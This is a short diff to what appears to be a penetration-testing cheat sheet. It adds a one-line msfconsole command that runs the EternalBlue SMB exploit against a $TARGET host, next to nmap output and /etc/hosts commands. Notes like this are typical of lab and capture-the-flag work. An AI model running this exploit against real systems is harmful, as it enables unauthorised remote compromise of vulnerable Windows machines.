@@ -40,6 +40,9 @@ cat *1000*.nmap
 cat *ALL*.nmap
 find . -name '*.nmap' -readable -exec echo {} \; -exec cat {} \;
 
+## metasploit
+msfconsole -x -q 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
+
 ## hosts
 echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts
 
